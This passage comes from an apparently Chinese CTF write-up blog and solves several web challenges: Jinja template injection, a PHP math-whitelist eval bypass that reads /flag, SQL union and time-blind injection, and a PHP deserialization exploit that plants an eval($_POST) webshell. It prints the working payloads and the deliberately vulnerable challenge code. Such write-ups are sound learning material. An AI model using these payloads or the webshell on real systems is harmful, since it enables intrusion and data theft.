<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>一个flask框架，里面有2个过滤，首先传入的参数中的()会被替换为空<br>其次<code>&#123;%set config=None%&#125;</code>,<code>&#123;%set self=None%&#125;</code>因此我们不能单独传入config或者是self<br><code>config</code>,<code>config|string</code>,<code>self.__dict__</code>等都给ban了<br>因此这一题我们的payload为：<br><code>url_for.__globals__.current_app.config</code>:</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666116596676-8651edf4-bd93-4871-bc57-e1a6a331c41f.png#averageHue=%23bab6b2&clientId=ua7780b99-61e1-4&from=paste&height=598&id=u8169e801&name=image.png&originHeight=748&originWidth=1784&originalType=binary&ratio=1&rotation=0&showTitle=false&size=208494&status=done&style=none&taskId=ud9dc6bbc-45ba-443c-8b0f-585f9b07777&title=&width=1427.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666116612636-1001ac5a-e0a9-491c-8032-5eb0c4ad81d0.png#averageHue=%23d0d0d0&clientId=ua7780b99-61e1-4&from=paste&height=586&id=u5edc82d2&name=image.png&originHeight=732&originWidth=1572&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31532&status=done&style=none&taskId=u3e092205-10bb-4b54-82c0-4e95ebb8502&title=&width=1257.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666116619644-dcf06484-68c0-4910-865f-dbfed91842ed.png#averageHue=%23cac9c8&clientId=ua7780b99-61e1-4&from=paste&height=590&id=ud6efb264&name=image.png&originHeight=738&originWidth=1774&originalType=binary&ratio=1&rotation=0&showTitle=false&size=84897&status=done&style=none&taskId=u309bbf6f-d8b1-4a20-bc24-77760cc13d3&title=&width=1419.2" alt="image.png"><br>current_app表示的可能就是当前的app了<br>用其他内置函数当然也可以咯~</p>
<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这边儿正则是怎么回事呢，就是你只可以输入白名单里的函数，<code>abs(123)</code>只会被识别abs，<code>abs(asd)</code>会被识别为abs和asd，就是这么一回事,<code>\x7f-\xff</code>表示数字字母和字符以外的一些乱码，防止我们异或，取反<br>这题的解法有点类似于自增<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666179574395-92ac0e61-b1d7-45e5-a8c6-d8fc69c3c76e.png#averageHue=%23faf9f9&clientId=uf28a64eb-b4bc-4&from=paste&height=578&id=udfb85e6f&name=image.png&originHeight=723&originWidth=1195&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44970&status=done&style=none&taskId=ue806bdeb-49bc-44a1-bf6b-338329c6783&title=&width=956" alt="image.png"><br>三十六进制的字符是由数字+小写字母构成的，所以把36进制的hex2bin转换为10进制后为<code>37907361743</code>,然后我们刚好白名单里有<code>base_convert</code>函数：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666179625044-bcb46ff1-f6dd-46c4-9550-b511e11d5829.png#averageHue=%23fcfcf7&clientId=uf28a64eb-b4bc-4&from=paste&height=196&id=u3d111fab&name=image.png&originHeight=245&originWidth=848&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11778&status=done&style=none&taskId=uc1caf0ae-f0d0-47d7-87ba-ab897cf16d4&title=&width=678.4" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666179628308-152906da-70b1-4134-906a-ebf0ddcb091e.png#averageHue=%23fdfcf8&clientId=uf28a64eb-b4bc-4&from=paste&height=290&id=u432a9836&name=image.png&originHeight=362&originWidth=793&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16244&status=done&style=none&taskId=ud97cf84c-70da-4aeb-bbb8-cb4be842c03&title=&width=634.4" alt="image.png"><br>进制转换函数，所以我们可以<code>base_convert(37907361743,10,36)</code>得到<code>hex2bin</code>，十六进制转字符串函数，然后白名单里又有<code>dechex</code>函数：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666179728946-ce3052ee-bd71-4bd6-937f-e18a24312525.png#averageHue=%23f7f6f5&clientId=uf28a64eb-b4bc-4&from=paste&height=42&id=ub7a91e8d&name=image.png&originHeight=53&originWidth=1134&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5088&status=done&style=none&taskId=ue031648a-7092-4832-845b-ef030a46ca8&title=&width=907.2" alt="image.png"><br>看看_GET的十六进制是<code>5f474554</code>,再将16进制转为10进制<code>1598506324</code><br>最后payload：<code>?c=1;$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;exp&#125;($$pi&#123;pi&#125;)&amp;exp=system&amp;pi=tac /flag</code><br>上述payload肯定都看得懂吧。。</p>
<h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666180417403-6364aebe-376e-4235-b177-0181986e9ef1.png#averageHue=%23f7f7f6&clientId=uf28a64eb-b4bc-4&from=paste&height=811&id=u80e839d6&name=image.png&originHeight=1014&originWidth=1437&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52573&status=done&style=none&taskId=u8554924c-a8f8-4a8d-96ee-dc6fa3183f5&title=&width=1149.6" alt="image.png"><br>让我们买flag，这边查看一下网页源代码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666180429720-61b08bb5-ba85-4ce5-8ecd-77f055dbbd8c.png#averageHue=%23fafafa&clientId=uf28a64eb-b4bc-4&from=paste&height=315&id=uf618ec14&name=image.png&originHeight=394&originWidth=918&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15076&status=done&style=none&taskId=uf303fb42-87d2-4823-bd71-02ecd2f65e7&title=&width=734.4" alt="image.png"><br>已经告诉我们是flag.php,访问一下就行：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666180445472-162d3fa4-6cc0-4462-b598-7730c124517d.png#averageHue=%23faf9f9&clientId=uf28a64eb-b4bc-4&from=paste&height=679&id=u444f502f&name=image.png&originHeight=849&originWidth=1379&originalType=binary&ratio=1&rotation=0&showTitle=false&size=220214&status=done&style=none&taskId=u335d53e5-6295-4171-abc7-3ec50dc7cf1&title=&width=1103.2" alt="image.png"><br>添加个XFF头：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666180466576-58967ce4-8355-4060-9709-9363c18958ab.png#averageHue=%239b9b9b&clientId=uf28a64eb-b4bc-4&from=paste&height=737&id=u74fc38c1&name=image.png&originHeight=921&originWidth=1715&originalType=binary&ratio=1&rotation=0&showTitle=false&size=199939&status=done&style=none&taskId=u1894d469-b454-4854-ba9d-205aaf35e60&title=&width=1372" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666180470953-87c779e7-5570-473f-be2b-ea183440e15c.png#averageHue=%23fafaf9&clientId=uf28a64eb-b4bc-4&from=paste&height=77&id=u81eefb52&name=image.png&originHeight=96&originWidth=1130&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6512&status=done&style=none&taskId=u1fd792ea-87df-4701-aaf0-676f1287d5a&title=&width=904" alt="image.png"><br>简单题</p>
<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>看似是xss实则是sql<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666242844584-3bccdb35-7b3e-4b48-880f-7354d5ed984f.png#averageHue=%23ededed&clientId=u8200987f-d024-4&from=paste&height=644&id=u1ca47f2c&name=image.png&originHeight=805&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32600&status=done&style=none&taskId=u88c8a079-daf9-4267-ae2e-3d9c7cbe885&title=&width=1536" alt="image.png"><br>一个登入界面，我先注册了一个账号~<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666242865886-c1e89daf-14f4-48a3-a984-7dab1322d1d9.png#averageHue=%23fefdfd&clientId=u8200987f-d024-4&from=paste&height=348&id=udbcf1659&name=image.png&originHeight=435&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28642&status=done&style=none&taskId=u680b4705-8cce-43c5-b5f4-7444bd4de3f&title=&width=1536" alt="image.png"><br>可以发布广告，我看到这个就以为是xss：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666242897337-688f26a0-68cb-4272-9ca8-5108474fb017.png#averageHue=%23f1f1f0&clientId=u8200987f-d024-4&from=paste&height=199&id=uc0078923&name=image.png&originHeight=249&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24007&status=done&style=none&taskId=u9b92d13d-1477-4ed7-bc35-daef6e8bba5&title=&width=1536" alt="image.png"><br>事实证明确实可以XSS，但是经过测试发现没有cookie，并不能获取管理员的cookie，黔驴技穷的时候发现标题存在SQL注入！：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666242942409-06bd367c-9c0d-4980-8b56-efa3c6c2e0b2.png#averageHue=%23fcfcfb&clientId=u8200987f-d024-4&from=paste&height=114&id=u060ca19d&name=image.png&originHeight=143&originWidth=1545&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11759&status=done&style=none&taskId=u80b61e2a-58b9-4281-bc37-2712a9cfea4&title=&width=1236" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666242948534-e24f415e-08b3-4371-870e-3249672422a3.png#averageHue=%23fdfbfb&clientId=u8200987f-d024-4&from=paste&height=146&id=u3f1308d6&name=image.png&originHeight=182&originWidth=1814&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19690&status=done&style=none&taskId=u55667862-16f5-4822-a359-416cb7088e0&title=&width=1451.2" alt="image.png"><br>！！！然后再经过一系列的FUZZ,发现只可以用联合查询，并且空格过滤了，只能用<code>/**/</code>去代替，接下来我就一步步的放payload了，没啥好讲<br><code>1&#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;</code><br>获取注入点<br><code>1&#39;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;</code><br>获取表名<br><code>1&#39;/**/union/**/select/**/1,(select/**/group_concat(c)/**/from/**/(select/**/1,2,(3)c/**/union/**/select/**/*/**/from/**/users)d),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#39;</code><br>子查询获取答案</p>
<h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>进入靶场一个很渗人的东西出现了：<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666249962680-142bd89b-eadc-487f-9739-22600b14d381.png#averageHue=%23010101&clientId=u56519293-f6ee-4&from=paste&id=u433d77e7&name=image.png&originHeight=931&originWidth=1164&originalType=url&ratio=1&rotation=0&showTitle=false&size=73220&status=done&style=none&taskId=u25da3c8f-2844-4449-ae7b-2d9540ab287&title=" alt="image.png"><br>我真的是栓Q，大半夜写的，我给你一拳啊，咳咳。我们右键没用但是不要紧，直接view-source:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666249962803-564c139e-ae3c-45af-a0a2-f96840f0cc89.png#averageHue=%23f6f6f5&clientId=u56519293-f6ee-4&from=paste&id=u9bc40f05&name=image.png&originHeight=277&originWidth=1058&originalType=url&ratio=1&rotation=0&showTitle=false&size=34789&status=done&style=none&taskId=ubde50956-3fb4-4265-828d-bbe87776eec&title=" alt="image.png"><br>发现了一个time.php?source，点进去康康发现源码直接给你了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">    &lt;?php</span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HelloPhp</span></span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        $this-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a = $this-&gt;a;</span><br><span class="line">        $b = $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@$ppp = unserialize(<span class="params">$_GET[<span class="string">&quot;data&quot;</span>]</span>);</span></span><br></pre></td></tr></table></figure>
<p>这个代码读起来很简单，一个构造函数，一个析构函数，重点是:echo $b($a);<br>想象一下，假如$b&#x3D;eval,$a&#x3D;system(‘ls’); 这是不是就能执行一条指令呢？<br>但是这样是会出错的：Fatal error: Uncaught Error: Call to undefined function eval() in E:\software\PhpStudy\PHPTutorial\WWW\1.php:3 Stack trace: #0 {main} thrown in E:\software\PhpStudy\PHPTutorial\WWW\1.php on line 3<br>原因：eval是因为是一个语言构造器而不是一个函数，不能被可变函数调用。不能用$a&#x3D;eval这种方式去调用，你只能直接写eval上去<br>eval不能用我们可以用assert（PHP&lt;&#x3D;7.1)</p>
<ul>
<li>assert(assertion):如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。</li>
</ul>
<p>所以我们可以构造以下文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HelloPhp</span></span><br><span class="line">&#123;</span><br><span class="line">    public $a=<span class="string">&#x27;eval($_POST[\&#x27;kino\&#x27;]);&#x27;</span>;</span><br><span class="line">    public $b=<span class="string">&quot;assert&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=new HelloPhp;</span><br><span class="line">echo serialize($a); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>很简单的一句话也就是最后我们会执行echo assert(eval($_POST[‘kino’]);),末尾的分号可有可无<br>这也就是上传了一句话木马，我们payload:?data&#x3D;O:8:”HelloPhp”:2:{s:1:”a”;s:20:”eval($_POST[‘kino’])”;s:1:”b”;s:6:”assert”;}<br>用蚁剑连接试试：<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666249963041-bc637c1c-90dd-4415-8b69-4fd569f9b84b.png#averageHue=%23e6e6e6&clientId=u56519293-f6ee-4&from=paste&id=u32debaca&name=image.png&originHeight=687&originWidth=1057&originalType=url&ratio=1&rotation=0&showTitle=false&size=94659&status=done&style=none&taskId=u0b6faa3c-2346-42f3-b75d-f67bc911df9&title=" alt="image.png"><br><strong>可以连接，但是点进去后什么也没发现，是空文件夹</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666249962786-6d07d01a-e6be-4616-8ea7-77edd9c993a6.png#averageHue=%23f0f0f0&clientId=u56519293-f6ee-4&from=paste&id=u77bd70ef&name=image.png&originHeight=430&originWidth=1336&originalType=url&ratio=1&rotation=0&showTitle=false&size=42119&status=done&style=none&taskId=u464acf71-0ca2-4a54-992b-afc93127226&title=" alt="image.png"><br>应该是没给权限，所以看不了，既然这样不行，我们就换种方法<br>我们已经可以上传一句话木马了，也就是说明我们可以远程RCE:<br>Payload:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666249963138-8055d768-d2f9-4ea9-ad3c-dc61cbfea0cd.png#averageHue=%23f9f9f9&clientId=u56519293-f6ee-4&from=paste&id=u1ec6e7f7&name=image.png&originHeight=576&originWidth=1462&originalType=url&ratio=1&rotation=0&showTitle=false&size=64189&status=done&style=none&taskId=u56c23d56-1b71-4893-a9c9-42d4a299a67&title=" alt="image.png"><br>发现无法执行ls指令，用其他的指令也不让用，最后使用phpinfo();，发现有了回显：<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666249963872-aa6f628a-e9de-4ae4-8d0c-2121a8f4febd.png#averageHue=%23b5996f&clientId=u56519293-f6ee-4&from=paste&id=u5ba58260&name=image.png&originHeight=680&originWidth=1768&originalType=url&ratio=1&rotation=0&showTitle=false&size=130320&status=done&style=none&taskId=udf3bf8f0-6545-4ab3-a046-9edb8a7f497&title=" alt="image.png"><br>那flag只能在这里了，我们搜索一下FLAG:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666249963887-f58f425b-c60f-497a-8d99-804cca467816.png#averageHue=%23e3ea2d&clientId=u56519293-f6ee-4&from=paste&id=u78c3f6ab&name=image.png&originHeight=129&originWidth=911&originalType=url&ratio=1&rotation=0&showTitle=false&size=11259&status=done&style=none&taskId=u7cf43147-189e-42f3-95b1-c3a1fb49600&title=" alt="image.png"><br>得到答案</p>
<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666249204356-1d1a0987-a5f4-4650-a631-6b3d1f46d5b2.png#averageHue=%23181818&clientId=u56519293-f6ee-4&from=paste&height=513&id=ubaade436&name=image.png&originHeight=641&originWidth=1302&originalType=binary&ratio=1&rotation=0&showTitle=false&size=431060&status=done&style=none&taskId=u96ad43fb-863c-4630-9d4d-f0d834da022&title=&width=1041.6" alt="image.png"><br>我算了一下,这人出了5个SQL题目，这应该是最后一个了吧<br>这次过滤的东西感觉太多了哭唧唧<br>这一题有2个注入点，一个是用户名密码那里，另一个就是在上面的点击神秘代码，也可以有注入点：<br>注入点1：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666249598070-02a0eb6d-bb3d-4f39-92e5-97c499ec994b.png#averageHue=%23151413&clientId=u56519293-f6ee-4&from=paste&height=458&id=ubfb888ba&name=image.png&originHeight=573&originWidth=1796&originalType=binary&ratio=1&rotation=0&showTitle=false&size=271504&status=done&style=none&taskId=u9be74fea-43c8-49f3-a544-eee1ba44606&title=&width=1436.8" alt="image.png"><br>注入点2：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666249614273-7ff4a40d-0057-453a-a63e-76285e2a3ebe.png#averageHue=%23131010&clientId=u56519293-f6ee-4&from=paste&height=606&id=ubd8ad538&name=image.png&originHeight=757&originWidth=1750&originalType=binary&ratio=1&rotation=0&showTitle=false&size=303776&status=done&style=none&taskId=uc93db246-ebcb-4e4c-8eca-72f866f3d82&title=&width=1400" alt="image.png"><br>注入点1无法使用sleep函数，不能有引号,不能if，也没有括号<br>注入点2可以使用sleep函数，不能if<br>所以注入点1大概率是没办法的~<br>所以我们在注入点2去注入<br>方法就是时间盲注，布尔盲注会有429，if被ban了可以用<code>elt()或者interval()</code>:</p>
<p>之后我就上脚本了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 